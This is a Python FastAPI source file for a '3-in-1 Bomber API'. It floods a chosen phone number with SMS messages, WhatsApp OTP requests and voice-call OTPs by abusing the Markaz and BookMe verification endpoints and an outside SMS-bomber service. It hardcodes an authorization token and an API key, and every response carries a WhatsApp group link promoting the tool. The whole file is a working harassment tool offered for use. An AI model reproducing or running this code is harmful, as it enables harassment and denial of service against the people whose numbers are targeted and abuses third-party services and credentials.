import asyncio
import httpx
from fastapi import FastAPI, Query
import os

app = FastAPI()

# BookMe Headers (for CALL only)
BOOKME_HEADERS = {
    'authority': 'api.bookme.pk',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'app-version': '84',
    'authorization': '277dfc7a02fbe4885de4b7355f13e75b55bfda9c1b9fd1833536583302499e26',
    'content-type': 'application/json',
    'origin': 'https://bookme.pk',
    'referer': 'https://bookme.pk/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
}

# Markaz Headers (for WhatsApp)
MARKAZ_HEADERS = {
    'Origin': 'https://www.markaz.app',
    'Referer': 'https://www.markaz.app/',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
}

# Global queue
request_queue = asyncio.Queue()
worker_running = False

# WhatsApp Group Link (HAR RESPONSE MEIN AAYEGA)
WA_GROUP_LINK = "https://chat.whatsapp.com/LYqp196iG0E0H5QtPR3ogZ"

async def send_sms(phone_number, count):
    """Send SMS using external API - runs only once with count parameter"""
    try:
        url = f"https://smsbomberapi-ruby.vercel.app/api/send?phone={phone_number}&count={count}"
        print(f"[📱 SMS] Sending {count} SMS to {phone_number} via external API")
        
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=30.0)
            print(f"[📱 SMS] Status: {response.status_code}")
            return {
                "success": True,
                "group_link": WA_GROUP_LINK,  # <-- SMS MEIN BHI
                "status_code": response.status_code,
                "response": response.text[:200] if response.text else "No response"
            }
    except Exception as e:
        print(f"[📱 SMS Error] {e}")
        return {
            "success": False,
            "group_link": WA_GROUP_LINK,  # <-- ERROR MEIN BHI
            "error": str(e)
        }

async def send_whatsapp(phone_number, count):
    """Send WhatsApp OTP using Markaz API - runs with 10s delay between attempts"""
    results = []
    
    try:
        # Clean number for WhatsApp
        clean_number = phone_number
        if not clean_number.startswith('92'):
            clean_number = f"92{clean_number}"
        
        url = f"https://do.markaz.app/otp/send/+{clean_number}/markaz"
        print(f"[💬 WhatsApp] Sending WhatsApp OTP to {clean_number}")
        print(f"[💬 WhatsApp] Group Link: {WA_GROUP_LINK}")
        
        async with httpx.AsyncClient() as client:
            for i in range(count):
                try:
                    print(f"[💬 WhatsApp] Attempt {i+1}/{count}")
                    response = await client.get(
                        url,
                        headers=MARKAZ_HEADERS,
                        timeout=10.0
                    )
                    print(f"[💬 WhatsApp] Status: {response.status_code}")
                    results.append({
                        "attempt": i + 1,
                        "success": response.status_code in [200, 201, 202],
                        "status_code": response.status_code,
                        "response": response.text[:100] if response.text else "No response"
                    })
                except Exception as e:
                    print(f"[💬 WhatsApp Error] {e}")
                    results.append({
                        "attempt": i + 1,
                        "success": False,
                        "error": str(e)
                    })
                
                # 10-second delay between attempts
                if i < count - 1:
                    print(f"[💬 WhatsApp] Waiting 10 seconds before next attempt...")
                    await asyncio.sleep(10)
        
        # WHATSAPP MEIN BHI GROUP LINK
        return {
            "success": True,
            "group_link": WA_GROUP_LINK,  # <-- WHATSAPP MEIN BHI
            "total_attempts": count,
            "results": results
        }
    except Exception as e:
        print(f"[💬 WhatsApp Error] {e}")
        return {
            "success": False,
            "group_link": WA_GROUP_LINK,  # <-- ERROR MEIN BHI
            "error": str(e)
        }

async def send_call(phone_number, count):
    """Send Voice Call OTP using BookMe API - runs with 20s delay between attempts"""
    results = []
    
    try:
        payload = {
            "api_key": "339b5853981492c85abb8169f5f00c61",
            "phone_number": phone_number,
            "provider_uid": 2457282069,
            "provider": "custom",
            "otp_type": "ivr",
            "iso": "PK",
            "captcha_token": "",
            "otp_method": "ivr"
        }

        async with httpx.AsyncClient() as client:
            for i in range(count):
                try:
                    print(f"[📞 CALL] Attempt {i+1}/{count} to {phone_number}")
                    response = await client.put(
                        "https://api.bookme.pk/api/v2/users/auth/updatePhoneNumber",
                        json=payload,
                        headers=BOOKME_HEADERS,
                        timeout=10.0
                    )
                    print(f"[📞 CALL] Status: {response.status_code}")
                    results.append({
                        "attempt": i + 1,
                        "success": response.status_code in [200, 201, 202],
                        "status_code": response.status_code,
                        "response": response.text[:100] if response.text else "No response"
                    })
                except Exception as e:
                    print(f"[📞 CALL Error] {e}")
                    results.append({
                        "attempt": i + 1,
                        "success": False,
                        "error": str(e)
                    })
                
                # 20-second delay between attempts
                if i < count - 1:
                    print(f"[📞 CALL] Waiting 20 seconds before next attempt...")
                    await asyncio.sleep(20)
        
        # CALL MEIN BHI GROUP LINK
        return {
            "success": True,
            "group_link": WA_GROUP_LINK,  # <-- CALL MEIN BHI
            "total_attempts": count,
            "results": results
        }
    except Exception as e:
        print(f"[📞 CALL Error] {e}")
        return {
            "success": False,
            "group_link": WA_GROUP_LINK,  # <-- ERROR MEIN BHI
            "error": str(e)
        }

async def bookme_request_worker():
    """Background worker - processes all requests"""
    global worker_running
    worker_running = True
    
    while True:
        try:
            number, count, method = await request_queue.get()
            
            method_name = {
                'sms': '📱 SMS',
                'ivr': '📞 CALL', 
                'whatsapp': '💬 WHATSAPP'
            }.get(method, '📱 SMS')
            
            print(f"[Worker] Starting {method_name} bombing for: {number}, Count: {count}")
            
            if method == 'sms':
                result = await send_sms(number, count)
            elif method == 'whatsapp':
                result = await send_whatsapp(number, count)
            elif method == 'ivr':
                result = await send_call(number, count)
            else:
                result = {"error": "Invalid method"}
            
            print(f"[Worker] Completed {method_name} for {number}")
            
            request_queue.task_done()
            
        except Exception as worker_err:
            print(f"[Worker Error]: {worker_err}")
            await asyncio.sleep(1)

@app.on_event("startup")
async def startup_event():
    """Start background worker on server startup"""
    asyncio.create_task(bookme_request_worker())
    print("[✅ Engine] Background Worker Started Successfully.")

@app.get("/")
async def root():
    return {
        "name": "3-in-1 Bomber API",
        "status": "running",
        "group_link": WA_GROUP_LINK,  # <-- ROOT MEIN BHI
        "methods": {
            "sms": "Send SMS OTP (External API - runs once with count)",
            "ivr": "Send Voice Call OTP (20s delay)",
            "whatsapp": "Send WhatsApp OTP (10s delay)"
        },
        "delays": {
            "sms": "Runs once with count parameter",
            "ivr": "20 seconds between each attempt",
            "whatsapp": "10 seconds between each attempt"
        },
        "usage": "/bomb?number=3097508053&count=5&method=sms",
        "examples": [
            "/bomb?number=3097508053&count=20&method=sms",
            "/bomb?number=3097508053&count=5&method=ivr",
            "/bomb?number=3097508053&count=3&method=whatsapp"
        ]
    }

@app.get("/bomb")
async def trigger_bomb(
    number: str = Query(..., description="Phone number (e.g., 3097508053)"),
    count: int = Query(default=1, ge=1, le=50, description="Number of attempts (max 50)"),
    method: str = Query(default="sms", description="Method: sms, ivr, or whatsapp")
):
    """
    🚀 3-in-1 Bomber API
    - sms: Send SMS OTP (External API - runs once with count)
    - ivr: Send Voice Call OTP (20s delay between attempts)
    - whatsapp: Send WhatsApp OTP (10s delay between attempts)
    """
    
    if not number:
        return {"error": "Number is required"}
    
    # Validate method
    if method not in ['sms', 'ivr', 'whatsapp']:
        return {
            "error": "Invalid method. Use: sms, ivr, or whatsapp",
            "example": "/bomb?number=3097508053&count=5&method=sms"
        }
    
    # Clean number
    clean_number = ''.join(filter(str.isdigit, number))
    if clean_number.startswith('92'):
        clean_number = clean_number[2:]
    if clean_number.startswith('0'):
        clean_number = clean_number[1:]
    
    if not clean_number.isdigit() or len(clean_number) != 10:
        return {
            "error": "Invalid number. Must be 10 digits (e.g., 3097508053)"
        }
    
    # Add to queue
    await request_queue.put((clean_number, count, method))
    
    method_name = {
        'sms': '📱 SMS',
        'ivr': '📞 CALL', 
        'whatsapp': '💬 WHATSAPP'
    }.get(method, '📱 SMS')
    
    delay_info = {
        'sms': 'Runs once with count parameter',
        'ivr': '20 seconds between attempts',
        'whatsapp': '10 seconds between attempts'
    }
    
    # HAR RESPONSE MEIN GROUP LINK
    return {
        "status": "queued",
        "message": f"{method_name} bombing started for {clean_number}",
        "count": count,
        "method": method,
        "delay": delay_info.get(method, '5 seconds'),
        "queue_size": request_queue.qsize(),
        "whatsapp_group": WA_GROUP_LINK,  # <-- HAR RESPONSE MEIN
        "note": f"Delay: {delay_info.get(method, '5 seconds')}"
    }

@app.get("/status")
async def get_status():
    """Check queue and worker status"""
    return {
        "queue_size": request_queue.qsize(),
        "is_processing": not request_queue.empty(),
        "worker_running": worker_running,
        "whatsapp_group": WA_GROUP_LINK  # <-- STATUS MEIN BHI
    }

@app.get("/health")
async def health_check():
    """Health check for Hugging Face"""
    return {
        "status": "healthy",
        "worker_running": worker_running,
        "queue_size": request_queue.qsize(),
        "whatsapp_group": WA_GROUP_LINK  # <-- HEALTH MEIN BHI
    }